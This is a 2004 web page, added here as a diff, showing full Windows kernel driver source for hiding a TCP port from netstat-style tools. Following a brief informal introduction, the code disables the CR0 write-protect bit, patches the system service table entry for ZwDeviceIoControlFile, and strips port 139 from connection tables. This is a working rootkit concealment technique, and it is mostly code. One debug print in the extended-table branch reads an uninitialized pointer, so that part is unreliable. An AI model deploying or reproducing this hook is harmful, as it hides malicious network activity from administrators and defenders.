@@ -1,0 +1,537 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
+<style type="text/css">
+<!--
+.title {FONT-FAMILY: "黑体", Arial, sans-serif; FONT-SIZE: 21px; FONT-WEIGHT: bold; LINE-HEIGHT: 48px; TEXT-DECORATION: none;}
+.author {font-family: "宋体";font-size: 12px;line-height: 16px;}
+.content {FONT-SIZE: 14px; LINE-HEIGHT: 20px;}
+-->
+</style>
+<title>Hook 系统服务隐藏端口</title>
+<meta name="keywords" content="jiurl IOCTL_TCP_QUERY_INFORMATION_EX TCPSNMPInfo TCPAddrEntry">
+</head>
+
+<body bgcolor="#F7F7F7" topmargin="5">
+
+<div align="center">
+  <center>
+
+<table border="0" width="96%" cellspacing="0" cellpadding="0" height="29">
+  <tr>
+    <td class=title width="100%" height="41">
+      <p align="center">Hook System Service to Hide Port</p>                                                            
+    </td>                                                       
+  </tr>                                                       
+  </center>                                             
+  <tr>                                                      
+    <td class=author width="100%" height="9">                                                      
+    <p align="center"><font face="宋体">作者: <a href="mailto:jiurl@mail.china.com"> JIURL</a>                                                                   
+    </font>                                                           
+    </p>                                                           
+    </td>                                                             
+  </tr>                                                            
+  <tr>                                                             
+    <td class=author width="100%" height="6">                                                             
+    <p align="center"><font face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;                                          
+    主页: <a href="http://jiurl.yeah.net"> http://jiurl.yeah.net</a>                                                                  
+    </font>                                                           
+    </td>                                                             
+  </tr>                                                            
+                                                   
+  <tr>                                                             
+    <td class=author width="100%" height="2">                                                             
+    <p align="center"><font face="宋体">&nbsp;&nbsp;&nbsp; 日期: 2004-03-30</font>                                                            
+    </td>                                                         
+  </tr>                                                        
+</table>                                                         
+</div>                                                
+<div align="center">                                               
+  <center>                                                        
+<table border="0" width="96%" cellspacing="0" cellpadding="0" height="1">                                                        
+  <tr>                                                        
+    <td width="100%" height="1">                                                        
+      <hr color="#396DA5" size="3">                                                        
+    </td>                                                        
+  </tr>                                                        
+</table>                                                        
+  </center>                                               
+</div>                                               
+<div align="center">                                               
+<table border="0" width="96%" cellspacing="0" cellpadding="0" class="content" height="200">                                                        
+  <tr>                                                        
+    <td width="131%" height="200" valign="top">                                                        
+    <p>&nbsp;&nbsp;&nbsp; Sometimes write code, debug code is really a 
+	interesting work, such as this time, with scamper about，with grinning xixi，with 
+	even not enough, the program has been done.<p>&nbsp;&nbsp;&nbsp; 
+	netstat or other like tools, such as fport, or sysinternals 's Tcpview， they 
+	all call the APIs in Iphlpapi.dll to list the ports. nevertheless Iphlpapi.dll's APIs 
+	at last call ZwDeviceIoControlFile ，to send IOCTL_TCP_QUERY_INFORMATION_EX 
+	to DeviceObject 
+	Device\Tcp to get various information. so we only need to Hook corresponding System 
+	Service 
+	，then do some work on the result, manage the target port's information. but 
+	the main trouble is, IOCTL_TCP_QUERY_INFORMATION_EX 
+	and port's all kinds of structure definiens , parameters's meanings are all Undocumented. Undocumented?? 
+	ring3 debug, I'm skilled ah. ring0 debug，I'm skilled ah. Windows Drivers，I'm 
+	skilled ah. Windows System，I'm skilled ah. I worry what ah I. Undocumented?? 
+	Yes，it's what i like.<p>&nbsp;&nbsp;&nbsp; 
+	by ring3 debug，analyse Iphlpapi.dll how to use IOCTL_TCP_QUERY_INFORMATION_EX 
+	's various parameters, and informations in msdn, so easily find out the 
+	structures what we need. using the awx written by me, New a vc project, code 
+	the Hook part.<p>&nbsp;&nbsp;&nbsp; 
+	The way to solve the Hook runs under various Windows Versions in this 
+	sample, appear many many places, I don't konw who find this way first, I 
+	first see this way in <span class="BoldText">book &lt;&lt;Undocumented 
+	Windows NT&gt;&gt;'s sources.</span><p><span class="BoldText">&nbsp;&nbsp; 
+	now,it's the source code, it's easy, then I needn't say more.</span><p><span class="BoldText">#if 0 
+	//================================================================<br>
+	Copyright (c) JIURL, All Rights Reserved<br>
+	========================================================================<br>
+	<br>
+	/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/<br>
+	<br>
+	Module Name:<br>
+	<br>
+	Jiurl_tcpioctl.h<br>
+	<br>
+	About:<br>
+	<br>
+	- This Driver Project is created by a AppWizard written by me.<br>
+	<br>
+	[ HomePage ] http://jiurl.yeah.net<br>
+	~~~~~~~~~~~~~~~~~~~~~<br>
+	[ Email ] jiurl@mail.china.com<br>
+	~~~~~~~~~~~~~~~~~~~~<br>
+	[ Forum ] http://jiurl.cosoft.org.cn/forum/index.php<br>
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>
+	<br>
+	Comments:<br>
+	<br>
+	The contents of this file are all undocumented, are the important things to 
+	hide port.</span><p><span class="BoldText">/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/<br>
+	#endif<br>
+	<br>
+	<br>
+	// jiurl // IPSNMPInfo </span>structure <span class="BoldText">is defined 
+	from RFC 2011 <br>
+	// jiurl // so I defined TCPSNMPInfo structure from RFC 2022 ，as IPSNMPInfo. <br>
+	// jiurl // some more analysis to get some extended definiens.<br>
+	typedef struct TCPSNMPInfo {<br>
+	ULONG tcpsi_RtoAlgorithm;<br>
+	ULONG tcpsi_RtoMin;<br>
+	ULONG tcpsi_RtoMax;<br>
+	ULONG tcpsi_MaxConn;<br>
+	ULONG tcpsi_ActiveOpens;<br>
+	ULONG tcpsi_PassiveOpens;<br>
+	ULONG tcpsi_AttemptFails;<br>
+	ULONG tcpsi_EstabResets;<br>
+	ULONG tcpsi_CurrEstab;<br>
+	ULONG tcpsi_InSegs;<br>
+	ULONG tcpsi_OutSegs;<br>
+	ULONG tcpsi_RetransSegs;<br>
+	ULONG tcpsi_unknown1;<br>
+	ULONG tcpsi_unknown2;<br>
+	ULONG tcpsi_numconn;<br>
+	} TCPSNMPInfo;<br>
+	<br>
+	#define tcpRtoAlgorithm_other 1 // none of the following<br>
+	#define tcpRtoAlgorithm_constant 2 // a constant rto<br>
+	#define tcpRtoAlgorithm_rsre 3 // MIL-STD-1778, Appendix B<br>
+	#define tcpRtoAlgorithm_vanj 4 // Van Jacobson's algorithm<br>
+	<br>
+	#define TCP_MIB_STATS_ID 1<br>
+	#define TCP_MIB_ADDRTABLE_ENTRY_ID 0x101<br>
+	#define TCP_MIB_ADDRTABLE_ENTRY_EX_ID 0x102<br>
+	<br>
+	<br>
+	typedef struct TCPAddrEntry {<br>
+	ULONG tae_ConnState;<br>
+	ULONG tae_ConnLocalAddress;<br>
+	ULONG tae_ConnLocalPort;<br>
+	ULONG tae_ConnRemAddress;<br>
+	ULONG tae_ConnRemPort;<br>
+	} TCPAddrEntry;<br>
+	<br>
+	#define tcpConnState_closed 1<br>
+	#define tcpConnState_listen 2<br>
+	#define tcpConnState_synSent 3<br>
+	#define tcpConnState_synReceived 4<br>
+	#define tcpConnState_established 5<br>
+	#define tcpConnState_finWait1 6<br>
+	#define tcpConnState_finWait2 7<br>
+	#define tcpConnState_closeWait 8<br>
+	#define tcpConnState_lastAck 9<br>
+	#define tcpConnState_closing 10<br>
+	#define tcpConnState_timeWait 11<br>
+	#define tcpConnState_deleteTCB 12<br>
+	<br>
+	typedef struct TCPAddrExEntry {<br>
+	ULONG tae_ConnState;<br>
+	ULONG tae_ConnLocalAddress;<br>
+	ULONG tae_ConnLocalPort;<br>
+	ULONG tae_ConnRemAddress;<br>
+	ULONG tae_ConnRemPort;<br>
+	ULONG pid;<br>
+	} TCPAddrExEntry;<br>
+	<br>
+	#if 0 //================================================================<br>
+	Copyright (c) JIURL, All Rights Reserved<br>
+	========================================================================<br>
+	<br>
+	/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/<br>
+	<br>
+	Module Name:<br>
+	<br>
+	JiurlPortHide.h<br>
+	<br>
+	About:<br>
+	<br>
+	- This Driver Project is created by a AppWizard written by me.<br>
+	<br>
+	[ HomePage ] http://jiurl.yeah.net<br>
+	~~~~~~~~~~~~~~~~~~~~~<br>
+	[ Email ] jiurl@mail.china.com<br>
+	~~~~~~~~~~~~~~~~~~~~<br>
+	[ Forum ] http://jiurl.cosoft.org.cn/forum/index.php<br>
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>
+	<br>
+	/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/<br>
+	#endif<br>
+	<br>
+	#define PORTHIDE 139<br>
+	<br>
+	#pragma pack(1)<br>
+	typedef struct ServiceDescriptorEntry {<br>
+	unsigned int *ServiceTableBase;<br>
+	unsigned int *ServiceCounterTableBase; //Used only in checked build<br>
+	unsigned int NumberOfServices;<br>
+	unsigned char *ParamTableBase;<br>
+	} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;<br>
+	#pragma pack()<br>
+	<br>
+	__declspec(dllimport) ServiceDescriptorTableEntry_t 
+	KeServiceDescriptorTable;<br>
+	<br>
+	<br>
+	NTSYSAPI<br>
+	NTSTATUS<br>
+	NTAPI<br>
+	ZwDeviceIoControlFile(<br>
+	IN HANDLE FileHandle,<br>
+	IN HANDLE Event OPTIONAL,<br>
+	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,<br>
+	IN PVOID ApcContext OPTIONAL,<br>
+	OUT PIO_STATUS_BLOCK IoStatusBlock,<br>
+	IN ULONG IoControlCode,<br>
+	IN PVOID InputBuffer OPTIONAL,<br>
+	IN ULONG InputBufferLength,<br>
+	OUT PVOID OutputBuffer OPTIONAL,<br>
+	IN ULONG OutputBufferLength<br>
+	);<br>
+	<br>
+	typedef NTSTATUS (*ZWDEVICEIOCONTROLFILE)(<br>
+	IN HANDLE FileHandle,<br>
+	IN HANDLE Event OPTIONAL,<br>
+	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,<br>
+	IN PVOID ApcContext OPTIONAL,<br>
+	OUT PIO_STATUS_BLOCK IoStatusBlock,<br>
+	IN ULONG IoControlCode,<br>
+	IN PVOID InputBuffer OPTIONAL,<br>
+	IN ULONG InputBufferLength,<br>
+	OUT PVOID OutputBuffer OPTIONAL,<br>
+	IN ULONG OutputBufferLength<br>
+	);<br>
+	<br>
+	ZWDEVICEIOCONTROLFILE OldZwDeviceIoControlFile;<br>
+	<br>
+	void DriverUnload(IN PDRIVER_OBJECT DriverObject);<br>
+	<br>
+	NTSTATUS<br>
+	DriverDispatch(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp);<br>
+	<br>
+	NTSTATUS NewZwDeviceIoControlFile(<br>
+	IN HANDLE FileHandle,<br>
+	IN HANDLE Event OPTIONAL,<br>
+	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,<br>
+	IN PVOID ApcContext OPTIONAL,<br>
+	OUT PIO_STATUS_BLOCK IoStatusBlock,<br>
+	IN ULONG IoControlCode,<br>
+	IN PVOID InputBuffer OPTIONAL,<br>
+	IN ULONG InputBufferLength,<br>
+	OUT PVOID OutputBuffer OPTIONAL,<br>
+	IN ULONG OutputBufferLength<br>
+	);<br>
+	<br>
+	<br>
+	// jiurl // from addrconv.cpp<br>
+	#define ntohs(s) \<br>
+	( ( ((s) &gt;&gt; 8) &amp; 0x00FF ) | \<br>
+	( ((s) &lt;&lt; 8) &amp; 0xFF00 ) )<br>
+	<br>
+	<br>
+	// jiurl // from tcpioctl.h tdiinfo.h tdistat.h<br>
+	#define IOCTL_TCP_QUERY_INFORMATION_EX 0x00120003<br>
+	<br>
+	//* Structure of an entity ID.<br>
+	typedef struct TDIEntityID {<br>
+	ULONG tei_entity;<br>
+	ULONG tei_instance;<br>
+	} TDIEntityID;<br>
+	<br>
+	//* Structure of an object ID.<br>
+	typedef struct TDIObjectID {<br>
+	TDIEntityID toi_entity;<br>
+	ULONG toi_class;<br>
+	ULONG toi_type;<br>
+	ULONG toi_id;<br>
+	} TDIObjectID;<br>
+	<br>
+	#define CONTEXT_SIZE 16<br>
+	//<br>
+	// QueryInformationEx IOCTL. The return buffer is passed as the OutputBuffer<br>
+	// in the DeviceIoControl request. This structure is passed as the<br>
+	// InputBuffer.<br>
+	//<br>
+	struct tcp_request_query_information_ex {<br>
+	TDIObjectID ID; // object ID to query.<br>
+	ULONG_PTR Context[CONTEXT_SIZE/sizeof(ULONG_PTR)]; // multi-request context. 
+	Zeroed<br>
+	// for the first request.<br>
+	};<br>
+	<br>
+	typedef struct tcp_request_query_information_ex<br>
+	TCP_REQUEST_QUERY_INFORMATION_EX,<br>
+	*PTCP_REQUEST_QUERY_INFORMATION_EX;<br>
+	<br>
+	#define CO_TL_ENTITY 0x400<br>
+	#define INFO_CLASS_PROTOCOL 0x200<br>
+	#define INFO_TYPE_PROVIDER 0x100<br>
+　</span><p>#if 0 
+	//================================================================<br>
+	Copyright (c) JIURL, All Rights Reserved<br>
+	========================================================================<br>
+	<br>
+	/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/<br>
+	<br>
+	Module Name:<br>
+	<br>
+	JiurlPortHide.cpp<br>
+	<br>
+	About:<br>
+	<br>
+	<span class="BoldText">- This Driver Project is created by a AppWizard 
+	written by me.</span><br>
+	<br>
+	[ HomePage ] http://jiurl.yeah.net<br>
+	~~~~~~~~~~~~~~~~~~~~~<br>
+	[ Email ] jiurl@mail.china.com<br>
+	~~~~~~~~~~~~~~~~~~~~<br>
+	[ Forum ] http://jiurl.cosoft.org.cn/forum/index.php<br>
+	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>
+	<br>
+	/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/<br>
+	#endif<br>
+	<br>
+	<br>
+	#ifdef __cplusplus<br>
+	extern &quot;C&quot;<br>
+	{<br>
+	#endif<br>
+	<br>
+	#include &lt;ntddk.h&gt;<br>
+	<br>
+	#include &quot;JiurlPortHide.h&quot;<br>
+	#include &quot;Jiurl_tcpioctl.h&quot;<br>
+	<br>
+	#ifdef __cplusplus<br>
+	}<br>
+	#endif<br>
+	<br>
+	NTSTATUS <br>
+	DriverEntry(IN PDRIVER_OBJECT DriverObject,<br>
+	IN PUNICODE_STRING RegistryPath)<br>
+	{<br>
+	DbgPrint(&quot;JiurlPortHide: Hello,This is DriverEntry!\n&quot;);<br>
+	<br>
+	DriverObject-&gt;MajorFunction[IRP_MJ_CREATE] = <br>
+	DriverObject-&gt;MajorFunction[IRP_MJ_CLOSE] = DriverDispatch; <br>
+	DriverObject-&gt;DriverUnload = DriverUnload; <br>
+	<br>
+	// save old system call locations<br>
+	OldZwDeviceIoControlFile = (ZWDEVICEIOCONTROLFILE)(KeServiceDescriptorTable.ServiceTableBase[ 
+	*(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]);<br>
+	<br>
+	_asm<br>
+	{<br>
+	CLI //dissable interrupt<br>
+	MOV EAX, CR0 //move CR0 register into EAX<br>
+	AND EAX, NOT 10000H //disable WP bit <br>
+	MOV CR0, EAX //write register back<br>
+	}<br>
+	<br>
+	(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]) 
+	= (ULONG)NewZwDeviceIoControlFile;<br>
+	<br>
+	_asm <br>
+	{<br>
+	MOV EAX, CR0 //move CR0 register into EAX<br>
+	OR EAX, 10000H //enable WP bit <br>
+	MOV CR0, EAX //write register back <br>
+	STI //enable interrupt<br>
+	}<br>
+	<br>
+	return STATUS_SUCCESS;<br>
+	}<br>
+	<br>
+	NTSTATUS<br>
+	DriverDispatch(<br>
+	IN PDEVICE_OBJECT DeviceObject,<br>
+	IN PIRP Irp<br>
+	)<br>
+	{<br>
+	Irp-&gt;IoStatus.Status = STATUS_SUCCESS;<br>
+	IoCompleteRequest (Irp,IO_NO_INCREMENT);<br>
+	return Irp-&gt;IoStatus.Status;<br>
+	}<br>
+	<br>
+	void DriverUnload(IN PDRIVER_OBJECT DriverObject)<br>
+	{<br>
+	DbgPrint(&quot;JiurlPortHide: Bye,This is DriverUnload!\n&quot;);<br>
+	<br>
+	_asm<br>
+	{<br>
+	CLI //dissable interrupt<br>
+	MOV EAX, CR0 //move CR0 register into EAX<br>
+	AND EAX, NOT 10000H //disable WP bit <br>
+	MOV CR0, EAX //write register back<br>
+	}<br>
+	<br>
+	(KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)ZwDeviceIoControlFile+1)]) 
+	= (ULONG)OldZwDeviceIoControlFile;<br>
+	<br>
+	_asm <br>
+	{<br>
+	MOV EAX, CR0 //move CR0 register into EAX<br>
+	OR EAX, 10000H //enable WP bit <br>
+	MOV CR0, EAX //write register back <br>
+	STI //enable interrupt<br>
+	}<br>
+	}<br>
+	<br>
+	NTSTATUS NewZwDeviceIoControlFile(<br>
+	IN HANDLE FileHandle,<br>
+	IN HANDLE Event OPTIONAL,<br>
+	IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,<br>
+	IN PVOID ApcContext OPTIONAL,<br>
+	OUT PIO_STATUS_BLOCK IoStatusBlock,<br>
+	IN ULONG IoControlCode,<br>
+	IN PVOID InputBuffer OPTIONAL,<br>
+	IN ULONG InputBufferLength,<br>
+	OUT PVOID OutputBuffer OPTIONAL,<br>
+	IN ULONG OutputBufferLength<br>
+	)<br>
+	{<br>
+	NTSTATUS rc;<br>
+	<br>
+	rc = ((ZWDEVICEIOCONTROLFILE)(OldZwDeviceIoControlFile)) (<br>
+	FileHandle,<br>
+	Event,<br>
+	ApcRoutine,<br>
+	ApcContext,<br>
+	IoStatusBlock,<br>
+	IoControlCode,<br>
+	InputBuffer,<br>
+	InputBufferLength,<br>
+	OutputBuffer,<br>
+	OutputBufferLength<br>
+	);<br>
+	<br>
+	if(IoControlCode != IOCTL_TCP_QUERY_INFORMATION_EX)<br>
+	{<br>
+	return(rc); <br>
+	}<br>
+	<br>
+	TCP_REQUEST_QUERY_INFORMATION_EX req;<br>
+	TCPAddrEntry* TcpTable;<br>
+	TCPAddrExEntry* TcpExTable;<br>
+	ULONG numconn;<br>
+	LONG i;<br>
+	<br>
+	DbgPrint(&quot;JiurlPortHide: IOCTL_TCP_QUERY_INFORMATION_EX\n&quot;);<br>
+	<br>
+	if( NT_SUCCESS( rc ) ) <br>
+	{<br>
+	req.ID.toi_entity.tei_entity = CO_TL_ENTITY;<br>
+	req.ID.toi_entity.tei_instance = 0;<br>
+	req.ID.toi_class = INFO_CLASS_PROTOCOL;<br>
+	req.ID.toi_type = INFO_TYPE_PROVIDER;<br>
+	req.ID.toi_id = TCP_MIB_ADDRTABLE_ENTRY_ID;<br>
+	<br>
+	if( !memcmp( InputBuffer, &amp;req, sizeof(TDIObjectID) ) )<br>
+	{<br>
+	numconn = IoStatusBlock-&gt;Information/sizeof(TCPAddrEntry);<br>
+	TcpTable = (TCPAddrEntry*)OutputBuffer;<br>
+	<br>
+	for( i=0; i&lt;numconn; i++ )<br>
+	{<br>
+	if( ntohs(TcpTable[i].tae_ConnLocalPort) == PORTHIDE )<br>
+	{<br>
+	DbgPrint(&quot;JiurlPortHide: HidePort %d\n&quot;, ntohs(TcpTable[i].tae_ConnLocalPort));<br>
+	<br>
+	memcpy( (TcpTable+i), (TcpTable+i+1), ((numconn-i-1)*sizeof(TCPAddrEntry)) 
+	);<br>
+	numconn--;<br>
+	i--;<br>
+	}<br>
+	}<br>
+	<br>
+	IoStatusBlock-&gt;Information = numconn*sizeof(TCPAddrEntry);<br>
+	return(rc);<br>
+	}<br>
+	<br>
+	<br>
+	req.ID.toi_id = TCP_MIB_ADDRTABLE_ENTRY_EX_ID;<br>
+	<br>
+	if( !memcmp( InputBuffer, &amp;req, sizeof(TDIObjectID) ) )<br>
+	{<br>
+	numconn = IoStatusBlock-&gt;Information/sizeof(TCPAddrExEntry);<br>
+	TcpExTable = (TCPAddrExEntry*)OutputBuffer;<br>
+	<br>
+	for( i=0; i&lt;numconn; i++ )<br>
+	{<br>
+	if( ntohs(TcpExTable[i].tae_ConnLocalPort) == PORTHIDE )<br>
+	{<br>
+	DbgPrint(&quot;JiurlPortHide: HidePort %d\n&quot;,ntohs(TcpTable[i].tae_ConnLocalPort));<br>
+	<br>
+	memcpy( (TcpExTable+i), (TcpExTable+i+1), ((numconn-i-1)*sizeof(TCPAddrExEntry)) 
+	);<br>
+	numconn--;<br>
+	i--;<br>
+	}<br>
+	}<br>
+	<br>
+	IoStatusBlock-&gt;Information = numconn*sizeof(TCPAddrExEntry);<br>
+	return(rc);<br>
+	}<br>
+	}<br>
+	<br>
+	return(rc);<br>
+	}<br>
+　<p>&nbsp; Download Source Code &amp; Sample<p>
+    <br>
+    <b>END</b><p>
+    How about the My English, ah hahahahaha.<br>
+    welcome communion, welcome make friends,<br>
+    welcome visit<br>
+    HomePage <a href="http://jiurl.yeah.net" target="_blank">http://jiurl.yeah.net</a> 
+    <a href="http://jiurl.nease.net/" target="_blank">http://jiurl.nease.net</a> 
+    Forum <a href="http://jiurl.cosoft.org.cn/forum" target="_blank">http://jiurl.cosoft.org.cn/forum</a>     
+    <p>　                                                       
+    <p>　  
+    </td>                                        
+  </tr>                                        
+</table>                                        
+</div>                                
+</body>                        
+</html>
